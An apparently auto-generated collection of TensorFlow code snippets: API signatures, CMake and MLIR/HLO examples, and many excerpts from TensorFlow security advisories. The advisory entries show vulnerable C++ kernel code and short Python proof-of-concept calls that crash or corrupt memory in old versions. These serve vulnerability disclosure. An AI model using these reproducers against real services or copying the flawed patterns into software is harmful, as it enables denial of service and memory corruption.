DESCRIPTION: This snippet demonstrates the `bitcast-convert` operation in XLA HLO for converting a scalar `f32` input to an `f16` vector. Similar to the previous case, the output shape gains a new minor-most dimension to accommodate the size difference (f32 4 bytes vs f16 2 bytes, ratio 2). An `f32[]` scalar becomes an `f16[2]{0}` vector.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_2

LANGUAGE: XLA HLO
CODE:
```
f16[2]{0} %output = f16[2]{0} bitcast-convert(f32[] %input)
```

----------------------------------------

TITLE: Adding Version to AssociatedFile - Python
DESCRIPTION: This Python function is used to add a version field to an AssociatedFile object being built using a FlatBuffers builder. It takes the builder object and the version value as arguments, facilitating the creation of structured metadata according to the schema.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/AssociatedFileAddVersion.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.AssociatedFileAddVersion(
    builder, version
)
```

----------------------------------------

TITLE: Processing Ragged Tensor Counts in TensorFlow C++
DESCRIPTION: This C++ code snippet demonstrates the vulnerable logic within the RaggedCountSparseOutput operation. It iterates through input 'values' and assigns counts to a per-batch map based on 'splits'. The lack of validation that 'splits' start at 0 allows out-of-bounds writes if splits_values(0) is not 0, as batch_idx will never be 1, causing an attempted access to per_batch_counts[0] which may not exist.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-016.md#_snippet_0

LANGUAGE: C++
CODE:
```
    auto per_batch_counts = BatchedMap<W>(num_batches);
    int batch_idx = 0;
    for (int idx = 0; idx < num_values; ++idx) {
      while (idx >= splits_values(batch_idx)) {
        batch_idx++;
      }
      const auto& value = values_values(idx);
      if (value >= 0 && (maxlength_ <= 0 || value < maxlength_)) {
        per_batch_counts[batch_idx - 1][value] = 1;
      }
    }
```

----------------------------------------

TITLE: Problematic CHECK Assertion in DrawBoundingBoxes - C++
DESCRIPTION: This C++ snippet shows the specific `CHECK_GE` assertion within the TensorFlow `DrawBoundingBoxes` kernel implementation that causes the vulnerability. When the input image height is zero, `max_box_row_clamp` becomes negative, triggering this assertion and aborting the program execution.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-022.md#_snippet_1

LANGUAGE: C++
CODE:
```
const int64 max_box_row_clamp = std::min<int64>(max_box_row, height - 1);
...
CHECK_GE(max_box_row_clamp, 0);
```

----------------------------------------

TITLE: Performing Segment Sum Write in TFLite C++
DESCRIPTION: This C++ snippet from the TensorFlow Lite reference operations demonstrates the loop where input data segments are summed into the output buffer. The `output_index` is directly derived from the `segment_ids_data`, which, if unsorted, can result in writes outside the bounds of the output buffer allocated based on the previous calculation logic.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-002.md#_snippet_1

LANGUAGE: C++
CODE:
```
  memset(output_data, 0, sizeof(T) * output_shape.FlatSize());
  for (int i = 0; i < input_shape.Dims(0); i++) {
    int output_index = segment_ids_data[i];
    for (int j = 0; j < segment_flat_size; ++j) {
      output_data[output_index * segment_flat_size + j] +=
          input_data[i * segment_flat_size + j];
    }
  }
```

----------------------------------------

TITLE: Reproducing TFSA-2022-093 Segfault in TFLite Conversion (Python)
DESCRIPTION: This Python code snippet demonstrates the TFSA-2022-093 vulnerability. It defines a Keras model with a custom layer using fake per-channel quantized transposed convolution, saves the model, and attempts to convert it to TFLite with default optimizations, triggering the reported segfault.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-093.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

class QuantConv2DTransposed(tf.keras.layers.Layer):
    def build(self, input_shape):
        self.kernel = self.add_weight("kernel", [3, 3, input_shape[-1], 24])

    def call(self, inputs):
        filters = tf.quantization.fake_quant_with_min_max_vars_per_channel(
            self.kernel, -3.0 * tf.ones([24]), 3.0 * tf.ones([24]), narrow_range=True
        )
        filters = tf.transpose(filters, (0, 1, 3, 2))
        return tf.nn.conv2d_transpose(inputs, filters, [*inputs.shape[:-1], 24], 1)


inp = tf.keras.Input(shape=(6, 8, 48), batch_size=1)
x = tf.quantization.fake_quant_with_min_max_vars(inp, -3.0, 3.0, narrow_range=True)
x = QuantConv2DTransposed()(x)
x = tf.quantization.fake_quant_with_min_max_vars(x, -3.0, 3.0, narrow_range=True)

model = tf.keras.Model(inp, x)

model.save("/tmp/testing")
converter = tf.lite.TFLiteConverter.from_saved_model("/tmp/testing")
converter.optimizations = [tf.lite.Optimize.DEFAULT]

# terminated by signal SIGSEGV (Address boundary error)
tflite_model = converter.convert()
```

----------------------------------------

TITLE: Demonstrating Data Loss with Nested tf.map_fn
DESCRIPTION: This Python snippet illustrates the data loss vulnerability using nested `tf.map_fn` with a `RaggedTensor` input and no signature. It shows that the output tensor will have truncated inner dimensions, losing data compared to the original input structure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-153.md#_snippet_1

LANGUAGE: python
CODE:
```
import tensorflow as tf
x = tf.ragged.constant([[1,2], [3,4,5], [6]])
t = tf.map_fn(lambda r: tf.map_fn(lambda y: r, r), x)
```

----------------------------------------

TITLE: Adding Default Score to ScoreCalibrationOptions (Python)
DESCRIPTION: This function adds a `defaultScore` value to the Flatbuffers builder when constructing `ScoreCalibrationOptions` metadata. It takes the Flatbuffers `builder` instance and the `defaultScore` (an integer or equivalent) as parameters. This is a low-level function typically used internally by metadata generation tools.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ScoreCalibrationOptionsAddDefaultScore.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ScoreCalibrationOptionsAddDefaultScore(
    builder, defaultScore
)
```

----------------------------------------

TITLE: Calling QuantizeAndDequantizeV2 with Invalid Axis (Python)
DESCRIPTION: This Python snippet demonstrates how to call the `tf.raw_ops.QuantizeAndDequantizeV2` operation with an `axis` value of `-2`. This specific value bypasses the flawed validation logic and can lead to a heap underflow vulnerability. It shows the input tensor and min/max values used in the demonstration.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-099.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

input_tensor = tf.constant([0.0], shape=[1], dtype=float)
input_min = tf.constant(-10.0)
input_max = tf.constant(-10.0)

tf.raw_ops.QuantizeAndDequantizeV2(
  input=input_tensor, input_min=input_min, input_max=input_max,
  signed_input=False, num_bits=1, range_given=False, round_mode='HALF_TO_EVEN',
  narrow_range=False, axis=-2)
```

----------------------------------------

TITLE: Triggering Division by Zero in FusedBatchNorm (Python)
DESCRIPTION: This Python snippet demonstrates a vulnerability in TensorFlow's `tf.raw_ops.FusedBatchNorm`. It creates input tensors (`x`, `scale`, `offset`, `mean`, `variance`) where the last dimension of `x` is zero, specifically crafted to trigger a division by zero within the kernel implementation, leading to a runtime error (FPE). This serves as a proof-of-concept for the reported denial-of-service vulnerability.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-043.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

x = tf.constant([], shape=[1, 1, 1, 0], dtype=tf.float32)
scale = tf.constant([], shape=[0], dtype=tf.float32)
offset = tf.constant([], shape=[0], dtype=tf.float32)
mean = tf.constant([], shape=[0], dtype=tf.float32)
variance = tf.constant([], shape=[0], dtype=tf.float32)
epsilon = 0.0
exponential_avg_factor = 0.0
data_format = "NHWC"
is_training = False

tf.raw_ops.FusedBatchNorm(
    x=x, scale=scale, offset=offset, mean=mean,
    variance=variance, epsilon=epsilon,
    exponential_avg_factor=exponential_avg_factor,
    data_format=data_format, is_training=is_training)
```

----------------------------------------

TITLE: Demonstrating SparseMatrixSparseCholesky Vulnerability (Python)
DESCRIPTION: This Python snippet constructs a simple sparse matrix and an invalid permutation tensor. It then calls `tf.raw_ops.SparseMatrixSparseCholesky` with these inputs to reproduce the reported null pointer dereference vulnerability caused by inadequate input validation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-018.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf
import numpy as np
from tensorflow.python.ops.linalg.sparse import sparse_csr_matrix_ops

indices_array = np.array([[0, 0]])
value_array = np.array([-10.0], dtype=np.float32)
dense_shape = [1, 1]
st = tf.SparseTensor(indices_array, value_array, dense_shape)

input = sparse_csr_matrix_ops.sparse_tensor_to_csr_sparse_matrix(
       st.indices, st.values, st.dense_shape)

permutation = tf.constant([], shape=[1, 0], dtype=tf.int32)

tf.raw_ops.SparseMatrixSparseCholesky(input=input, permutation=permutation, type=tf.float32)
```

----------------------------------------

TITLE: Demonstrating QuantizedRelu/QuantizedRelu6 Segfault with non-scalar inputs - TensorFlow Python
DESCRIPTION: This Python snippet demonstrates the TensorFlow vulnerability (TFSA-2022-109) where providing non-scalar tensors for `min_features` or `max_features` to the `tf.raw_ops.QuantizedRelu` or `tf.raw_ops.QuantizedRelu6` operations causes a segfault. It requires the TensorFlow library. The code sets up example tensor inputs, including a zero-shaped `min_features` and a single-element `max_features`, and calls the vulnerable operations, which would crash on affected TensorFlow versions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-109.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

out_type = tf.quint8
features = tf.constant(28, shape=[4,2], dtype=tf.quint8)
min_features = tf.constant([], shape=[0], dtype=tf.float32)
max_features = tf.constant(-128, shape=[1], dtype=tf.float32)
tf.raw_ops.QuantizedRelu(features=features, min_features=min_features, max_features=max_features, out_type=out_type)
tf.raw_ops.QuantizedRelu6(features=features, min_features=min_features, max_features=max_features, out_type=out_type)
```

----------------------------------------

TITLE: Calculating Tensor Dimension Size - TFLite C++
DESCRIPTION: This snippet from the TFLite `Split_V` operation calculates the size of a specific dimension of an input tensor by calling the `SizeOfDimension` helper function. The vulnerability occurs here if the `axis_value` is outside the valid range of dimensions, leading to an out-of-bounds read within the `SizeOfDimension` function.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-094.md#_snippet_0

LANGUAGE: C++
CODE:
```
const int input_size = SizeOfDimension(input, axis_value);
```

----------------------------------------

TITLE: Checking SubGraph Metadata Buffer Identifier in TensorFlow Lite Metadata (Python)
DESCRIPTION: A class method to verify if a given byte buffer (`buf`) at a specific `offset` contains the correct FlatBuffer identifier for `SubGraphMetadata`. The `size_prefixed` parameter handles size-prefixed FlatBuffers. Useful for validating the type of data loaded into a buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadata.md#_snippet_30

LANGUAGE: python
CODE:
```
@classmethod
SubGraphMetadataBufferHasIdentifier(
    buf, offset, size_prefixed=False
)
```

----------------------------------------

TITLE: Demonstrating SobolSample DoS Vulnerability in TensorFlow
DESCRIPTION: This Python code snippet demonstrates the denial-of-service vulnerability in `tf.raw_ops.SobolSample`. It provides non-scalar tensors for parameters (`dim`, `num_results`, `skip`) that the operation expects to be scalar, triggering an assertion failure and leading to a crash or denial of service. This requires the vulnerable version of TensorFlow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-086.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
tf.raw_ops.SobolSample(dim=tf.constant([1,0]), num_results=tf.constant([1]), skip=tf.constant([1]))
```

----------------------------------------

TITLE: Initializing Object from Buffer in Python
DESCRIPTION: Initializes the object instance using a FlatBuffer buffer and a specific position. This method is typically used internally after obtaining the root object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadata.md#_snippet_9

LANGUAGE: python
CODE:
```
Init(
    buf, pos
)
```

----------------------------------------

TITLE: Gather Source Files (CMake)
DESCRIPTION: Uses the 'file(GLOB_RECURSE)' command to find all C++ source files ('*.cc') recursively within the current directory and its subdirectories. The paths to these files are stored in the variable 'TF_RUNTIME_SRC'.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/pip_package/xla_build/CMakeLists.txt#_snippet_1

LANGUAGE: CMake
CODE:
```
file(GLOB_RECURSE TF_RUNTIME_SRC "*.cc")
```

----------------------------------------

TITLE: Setting CMake Variable for gtest Main Tests
DESCRIPTION: Defines a CMake list variable containing the names of C++ test files that use the Google Test framework's `main` function. This list is used later to add test targets.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/kernels/CMakeLists.txt#_snippet_0

LANGUAGE: CMake
CODE:
```
set(TEST_WITH_GTEST_MAIN_LIST
  cpu_backend_gemm_test.cc
  cpu_backend_threadpool_test.cc
  eigen_support_test.cc
  kernel_util_test.cc
  optional_tensor_test.cc
  subgraph_test_util_test.cc
  test_util_test.cc
)
```

----------------------------------------

TITLE: Output Example: Inlined Ops in Island (TPU V1 Inlining)
DESCRIPTION: This MLIR snippet shows the result after applying the `-tf-executor-tpu-v1-island-inlining` pass. The content of the outlined function from the nested module has been inlined back into the `tf_executor.island`, and the `tf.PartitionedCall` is replaced by the original operations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_20

LANGUAGE: MLIR
CODE:
```
module  {
  func @foo(%arg0: tensor<f32>) -> tensor<f32> {
    %0 = tf_executor.graph {
      %outputs, %control = tf_executor.island {
        %1 = "tf.opA"(%arg0) : (tensor<f32>) -> tensor<f32>
        tf_executor.yield %1 : tensor<f32>
      }
      tf_executor.fetch %outputs : tensor<f32>
    }
    return %0 : tensor<f32>
  }
}
```

----------------------------------------

TITLE: Generic Async Operation with Syntax Sugar - HLO
DESCRIPTION: This HLO example shows the proposed syntax sugar for generic asynchronous operations. Instead of explicitly using `async-start`/`async-update`/`async-done` and a separate computation, the operation name is suffixed (e.g., `op-start`, `op-update`, `op-done`). This HLO representation is intended to be parsed into the same internal structure as the previous example.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/async_ops.md#_snippet_3

LANGUAGE: HLO
CODE:
```
%op-start = (f32[64], f32[32], s32[]) op-start(f32[64] %operand),
                                      op_specific_attr=âfooâ
%op-update0 = (f32[64], f32[32], s32[]) op-update(
                        (f32[64], f32[32], s32[]) %op-start),
                        op_specific_attr=âfooâ
%op-update1 = (f32[64], f32[32], s32[]) op-update(
                        (f32[64], f32[32], s32[]) %op-update0)
%op-done = f32[32] op-done((f32[64], f32[32], s32[]) %op-update1)
```

----------------------------------------

TITLE: Reproducing Multiframe GIF Segfault Vulnerability with TensorFlow Python
DESCRIPTION: This Python snippet demonstrates how to reproduce the multiframe GIF decoding vulnerability (CVE-2023-25667). It downloads a specific problematic GIF file and attempts to decode it using `tf.io.decode_gif`, which can trigger the integer overflow and potentially cause a segfault or crash. Prerequisites: Python and TensorFlow installed. Inputs: A specially crafted GIF file. Outputs: Potentially a crash or error due to the decoding failure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2023-004.md#_snippet_0

LANGUAGE: python
CODE:
```
import urllib.request
dat = urllib.request.urlopen('https://raw.githubusercontent.com/tensorflow/tensorflow/1c38ad9b78ffe06076745a1ee00cec42f39ff726/tensorflow/core/lib/gif/testdata/3g_multiframe.gif').read()
import tensorflow as tf
tf.io.decode_gif(dat)
```

----------------------------------------

TITLE: Calculating Output Size Dimensions in TensorFlow C++
DESCRIPTION: This C++ loop iterates through the dimensions of a tensor's output shape and multiplies their sizes together to calculate the total number of elements. It is part of the `OpLevelCostEstimator::CalculateOutputSize` function in TensorFlow's Grappler component. The vulnerability arises here as the `output_size` variable can overflow if the product of dimension sizes exceeds the maximum value of its integer type.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-039.md#_snippet_0

LANGUAGE: C++
CODE:
```
for (const auto& dim : output_shape.dim()) {
  output_size *= dim.size();
}
```

----------------------------------------

TITLE: Accessing Dimension with Negative Index - TensorFlow C++
DESCRIPTION: These C++ methods (`Dim` and `DimKnownRank`) from the shape inference helper demonstrate how dimensions are accessed, including support for Python-like negative indexing. The `DimKnownRank` method calculates the index for negative values as `s->dims_[s->dims_.size() + idx]`. If `idx` is a large negative number, this calculation can result in an index accessing memory before the start of the `s->dims_` array, causing the out-of-bounds read.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-002.md#_snippet_2

LANGUAGE: c++
CODE:
```
  DimensionHandle Dim(ShapeHandle s, int64_t idx) {
    if (!s.Handle() || s->rank_ == kUnknownRank) {
      return UnknownDim();
    }
    return DimKnownRank(s, idx);
  }
 
  static DimensionHandle DimKnownRank(ShapeHandle s, int64_t idx) {
    CHECK_NE(s->rank_, kUnknownRank);
    if (idx < 0) {
      return s->dims_[s->dims_.size() + idx];
    }
    return s->dims_[idx];
  }
```

----------------------------------------

TITLE: Vulnerable PyArray Type Handling Switch / TensorFlow / C++
DESCRIPTION: This C++ snippet from `ndarray_tensor.cc` shows the switch statement handling Python array types during conversion to TensorFlow Data Types. The vulnerability occurs when `pyarray_type` is `NPY_VOID`, intended for complex types like quantized or resource handles, but the associated descriptor (`descr`) has a null field, leading to a dereference later.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-003.md#_snippet_6

LANGUAGE: cpp
CODE:
```
  int pyarray_type = PyArray_TYPE(array);
  PyArray_Descr* descr = PyArray_DESCR(array);
  switch (pyarray_type) {
    ...
    case NPY_VOID:
      // Quantized types are currently represented as custom struct types.
      // PyArray_TYPE returns NPY_VOID for structs, and we should look into
      // descr to derive the actual type.
      // Direct feeds of certain types of ResourceHandles are represented as a
      // custom struct type.
      return PyArrayDescr_to_TF_DataType(descr, out_tf_datatype);
    ...
  }
```

----------------------------------------

TITLE: Checking Batch Dimension Rank - TensorFlow C++
DESCRIPTION: This C++ snippet from the `ReverseSequence` shape inference implementation shows the insufficient validation for the `batch_dim` parameter. It checks if `batch_dim` exceeds the input rank but fails to validate if it is a large negative number, allowing the subsequent call to `c->Dim` with a potentially invalid index.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-002.md#_snippet_1

LANGUAGE: c++
CODE:
```
  const int32_t input_rank = c->Rank(input);
  if (batch_dim >= input_rank) {
    return errors::InvalidArgument(
        "batch_dim must be < input rank: ", batch_dim, " vs. ", input_rank);
  }
  // ...

  DimensionHandle batch_dim_dim = c->Dim(input, batch_dim);
```

----------------------------------------

TITLE: Vulnerable Division Calculation in TensorFlow C++ Kernel
DESCRIPTION: This C++ code snippet from the TensorFlow `count_ops.cc` kernel shows the calculation that leads to the division-by-zero vulnerability. It computes `num_batch_elements` based on the input tensor shape (`data`) and then uses it as a divisor. When `data` (corresponding to the `values` argument in Python) has zero dimensions with size zero (like `shape=[0, 0]`), `num_batch_elements` becomes 0, causing a Floating Point Exception (FPE).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-042.md#_snippet_1

LANGUAGE: cc
CODE:
```
int num_batch_elements = 1;
for (int i = 0; i < num_batch_dimensions; ++i) {
  num_batch_elements *= data.shape().dim_size(i);
}
int num_value_elements = data.shape().num_elements() / num_batch_elements;
```

----------------------------------------

TITLE: Defining Equality Method (__eq__) in Python
DESCRIPTION: This snippet provides the signature for the `__eq__` method within the `BertCluAnnotatorOptions` class. This method is typically used in Python to define how equality comparisons (`==`) between two objects of this class are performed, taking another object (`other`) as input.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/text/BertCluAnnotatorOptions.md#_snippet_1

LANGUAGE: Python
CODE:
```
__eq__(\n    other\n)
```

----------------------------------------

TITLE: Running mlir-bisect Tool (Shell)
DESCRIPTION: Provides the command to execute `mlir-bisect` on the generated MLIR file. It requires specifying the HLO snapshot used for comparison, the MLIR file corresponding to the state before the problematic pass (identified by `mlir-replay`), and an optional pass pipeline to run beforehand (often bufferization passes).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir/tools/mlir_bisect/README.md#_snippet_2

LANGUAGE: shell
CODE:
```
bazel run tensorflow/compiler/xla/mlir/tools/mlir_bisect:mlir-bisect -- \\
  --hlo-snapshot=/tmp/dump/module_0000.jit_something.snapshot.0.pb \\
  --pass-pipeline="builtin.module(empty-tensor-to-alloc-tensor,one-shot-bufferize{allow-return-allocs bufferize-function-boundaries create-deallocs=0})" \\
  /tmp/execution/0052.ScalarizationPass.mlir
```

----------------------------------------

TITLE: Triggering Heap Buffer Overflow in TensorFlow CTCLoss (Python)
DESCRIPTION: This Python snippet shows how specific tensor shapes, data, and negative values, particularly in `labels_indices`, can exploit the incomplete validation in `tf.raw_ops.CTCLoss` to cause a heap buffer overflow. It uses tensors with minimal non-zero dimensions but problematic data values to trigger the vulnerability.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-101.md#_snippet_1

LANGUAGE: python
CODE:
```
import tensorflow as tf

inputs = tf.constant([], shape=[7, 2, 0], dtype=tf.float32)
labels_indices = tf.constant([-100, -100], shape=[2, 1], dtype=tf.int64)
labels_values = tf.constant([-100, -100], shape=[2], dtype=tf.int32)
sequence_length = tf.constant([-100, -100], shape=[2], dtype=tf.int32)

tf.raw_ops.CTCLoss(inputs=inputs, labels_indices=labels_indices,
                   labels_values=labels_values, sequence_length=sequence_length,
                   preprocess_collapse_repeated=False, ctc_merge_repeated=False,
                   ignore_longer_outputs_than_inputs=False)
```

----------------------------------------

TITLE: Triggering SparseBinCount Heap OOB - TensorFlow Python
DESCRIPTION: This Python snippet demonstrates how to trigger the heap out-of-bounds vulnerability in `tf.raw_ops.SparseBincount`. By providing a negative value (-10000000) within the `values` argument, the lack of validation in the underlying C++ kernel leads to an attempted write at an invalid memory location.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-171.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.SparseBincount(
  indices=[[0],[1],[2]]
  values=[0,-10000000]
  dense_shape=[1,1]
  size=[1]
  weights=[3,2,1]
  binary_output=False)
```

----------------------------------------

TITLE: Get Root Content Object from Buffer (Deprecated) Python
DESCRIPTION: A deprecated class method serving the same purpose as `GetRootAs` for initializing a Content object from a buffer. Users are advised to switch to `GetRootAs`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/Content.md#_snippet_4

LANGUAGE: python
CODE:
```
@classmethod
GetRootAsContent(
    buf, offset=0
)
```

----------------------------------------

TITLE: Listing Sparse Core Layout APIs (C++)
DESCRIPTION: This snippet lists C++ symbols for the Sparse Core Layout Stacker utility, exposed by the `//tensorflow/core/tpu/kernels:sparse_core_layout` build target. It includes methods for adding tables and retrieving layouts.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/def_file_filter/symbols_pybind.txt#_snippet_12

LANGUAGE: C++
CODE:
```
tensorflow::tpu::SparseCoreLayoutStacker::AddTable
```

LANGUAGE: C++
CODE:
```
tensorflow::tpu::SparseCoreLayoutStacker::SparseCoreLayoutStacker
```

LANGUAGE: C++
CODE:
```
tensorflow::tpu::SparseCoreLayoutStacker::AddTable
```

LANGUAGE: C++
CODE:
```
tensorflow::tpu::SparseCoreLayoutStacker::GetLayouts
```

----------------------------------------

TITLE: C++ Merger Class Method Signatures
DESCRIPTION: Shows the function signatures for the primary C++ `Merger` class methods used to reassemble chunked protobuf messages, supporting merging from a collection of in-memory chunks or directly from files using a prefix.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/proto_splitter/README.md#_snippet_3

LANGUAGE: c++
CODE:
```
absl::Status Merger::Merge(
  const std::vector<std::unique_ptr<tsl::protobuf::Message>>& chunks,
  const ::proto_splitter::ChunkedMessage& chunked_message,
  tsl::protobuf::Message* merged);

absl::Status Merger::Read(std::string prefix, tsl::protobuf::Message* merged);
```

----------------------------------------

TITLE: Triggering Division by Zero in TensorFlow DenseCountSparseOutput Python
DESCRIPTION: This Python code snippet demonstrates how to trigger a denial-of-service vulnerability in TensorFlow's `tf.raw_ops.DenseCountSparseOutput` by providing empty tensors for `values` and `weights`. This specific input causes a division by zero error in the underlying C++ kernel implementation, leading to a crash.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-042.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

values = tf.constant([], shape=[0, 0], dtype=tf.int64)
weights = tf.constant([])

tf.raw_ops.DenseCountSparseOutput(
  values=values, weights=weights,
  minlength=-1, maxlength=58, binary_output=True)
```

----------------------------------------

TITLE: Triggering SparseMatMul Vulnerability - Python
DESCRIPTION: This Python snippet demonstrates how to trigger the TFSA-2021-178 vulnerability in TensorFlow's `tf.raw_ops.SparseMatMul`. By providing a zero-dimensional tensor `b=[[],[],[]]`, the operation attempts to bind a reference to a `nullptr` in the underlying C++ kernel, leading to undefined behavior or heap out-of-bounds access before the patch is applied. Requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-178.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf

tf.raw_ops.SparseMatMul(
  a=[[1.0,1.0,1.0]],
  b=[[],[],[]],
  transpose_a=False,
  transpose_b=False,
  a_is_sparse=False,
  b_is_sparse=True)
```

----------------------------------------

TITLE: Triggering TensorFlow UnravelIndex Vulnerability (Python)
DESCRIPTION: This Python snippet demonstrates the TFSA-2022-006 vulnerability in tf.raw_ops.UnravelIndex. It uses specific large negative index and large positive dimensions designed to cause an integer overflow within the C++ implementation, leading to a division by zero error and potential crash.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-006.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.UnravelIndex(indices=-0x100000,dims=[0x100000,0x100000])
```

----------------------------------------

TITLE: Building MLIR Dialect Library (StablehloExtensionOps) - CMake
DESCRIPTION: This CMake command defines a target for building an MLIR dialect library called `StablehloExtensionOps`. It uses `stablehlo_ops.cpp` as a source, specifies a dependency on `StablehloOpsIncGen`, and publicly links against `StablehloExtensionBase` and several MLIR core/support libraries.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/stablehlo_ext/IR/CMakeLists.txt#_snippet_1

LANGUAGE: CMake
CODE:
```
add_mlir_dialect_library(StablehloExtensionOps
  PARTIAL_SOURCES_INTENDED
  stablehlo_ops.cpp

  DEPENDS
  StablehloOpsIncGen

  LINK_LIBS PUBLIC
  StablehloExtensionBase
  MLIRFuncDialect
  MLIRIR
  MLIRSupport
  StablehloOps
)
```

----------------------------------------

TITLE: Configuring TFLite XNNPACK Delegate CMake
DESCRIPTION: This block configures the TFLite XNNPACK delegate if the `TFLITE_ENABLE_XNNPACK` option is enabled. It finds `fp16_headers` and the XNNPACK package, conditionally finds the `NEON_2_SSE` package on x86, populates XNNPACK delegate sources, adds a custom command to generate a flatbuffer header for the weight cache schema, defines a static library `xnnpack-delegate` with sources and generated header, sets its include directories, and links required libraries (Eigen and optional NEON_2_SSE).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/CMakeLists.txt#_snippet_32

LANGUAGE: CMake
CODE:
```
if(TFLITE_ENABLE_XNNPACK)
  find_package(fp16_headers REQUIRED)
  find_package(XNNPACK REQUIRED)
  set(XNNPACK_NEON_2_SSE "")
  if (NOT CMAKE_SYSTEM_PROCESSOR OR CMAKE_SYSTEM_PROCESSOR MATCHES "x86")
    find_package(NEON_2_SSE REQUIRED)
    list(APPEND XNNPACK_NEON_2_SSE NEON_2_SSE::NEON_2_SSE)
  endif()
  populate_tflite_source_vars("delegates/xnnpack"
    TFLITE_DELEGATES_XNNPACK_SRCS
    FILTER ".*(_test|_tester)\\.(cc|h)"
  )
  add_custom_command(
    OUTPUT "${PROJECT_BINARY_DIR}/tensorflow/lite/delegates/xnnpack/weight_cache_schema_generated.h"
    COMMAND "${FLATBUFFERS_FLATC_EXECUTABLE}" -c
      -o "${PROJECT_BINARY_DIR}/tensorflow/lite/delegates/xnnpack/"
      --gen-mutable --gen-object-api
      "${TFLITE_SOURCE_DIR}/delegates/xnnpack/weight_cache_schema.fbs"
    DEPENDS "${FLATC_TARGET}" "${TFLITE_SOURCE_DIR}/delegates/xnnpack/weight_cache_schema.fbs"
  )

  add_library(xnnpack-delegate STATIC
    "${TFLITE_DELEGATES_XNNPACK_SRCS}"
    "${PROJECT_BINARY_DIR}/tensorflow/lite/delegates/xnnpack/weight_cache_schema_generated.h"
  )
  target_include_directories(xnnpack-delegate
    PUBLIC $<BUILD_INTERFACE:${TENSORFLOW_SOURCE_DIR}> $<INSTALL_INTERFACE:${CMAKE_INSTALL_INCLUDEDIR}>
    PRIVATE "${PROJECT_BINARY_DIR}"
  )
  target_link_libraries(xnnpack-delegate
    Eigen3::Eigen
  )
```

----------------------------------------

TITLE: Setting Unknown Output Shape in TensorFlow Grappler C++
